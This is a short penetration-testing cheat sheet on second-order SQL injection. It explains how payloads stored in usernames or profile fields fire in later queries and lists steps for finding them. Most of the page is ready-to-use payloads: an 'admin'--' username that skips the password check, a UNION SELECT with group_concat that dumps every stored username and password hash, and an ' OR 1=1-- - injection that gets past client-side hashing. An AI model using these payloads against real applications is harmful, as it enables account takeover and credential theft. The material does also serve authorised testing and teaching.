# Second-Order SQL Injection

Payload is stored safely on first input (escaping applied), then used unsanitized in a subsequent query — often via stored values like usernames, profile fields, or search history.

## Identify

1. Register a user/account with a SQLi payload as the value (e.g. username: `admin'--`)
2. Trigger an action that fetches and uses that stored value in a new query (login, profile load, search)
3. Watch for behavioral differences (error, auth bypass, data leak)

## Admin hash via second-order SQLi in login

```sql
-- Username: admin'-- 
-- On login the query becomes:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'
-- Bypasses password check for 'admin'
```

## Data exfil via stored payload

Register username as:
```
' UNION SELECT 1,2,group_concat(username,0x3a,password),4 FROM users-- -
```
When the app fetches your profile and displays "Welcome, <username>", it leaks all hashes.

## Hash injection for admin login (client-side hashing)

If the login form hashes the password client-side (JS) before sending:
```bash
# Intercept in Burp, send the raw hash value directly without going through the JS hash function
# The server-side query becomes: WHERE hash = '<your_raw_input>'
# Inject: ' OR 1=1-- -
```
